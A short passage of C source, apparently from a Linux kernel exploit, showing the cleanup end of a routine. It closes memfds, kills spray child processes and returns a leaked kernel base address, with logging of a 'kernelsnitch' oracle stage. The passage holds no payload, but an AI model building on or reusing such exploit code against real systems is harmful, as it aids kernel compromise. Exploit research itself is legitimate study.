#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
          payload_mode);

  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
          prepare_ctx.mm_cnt);
#endif
  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
      prepare_ctx.memfds[i] = -1;
    }
    if (prepare_ctx.childs[i] > 0) {
      kill_child(prepare_ctx.childs[i]);
      prepare_ctx.childs[i] = -1;
    }
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
        i + 1 == prepare_ctx.mm_cnt) {
      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
              i + 1, prepare_ctx.mm_cnt);
    }
#endif
  }
#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
          base);
#endif

  return base;
}

#endif
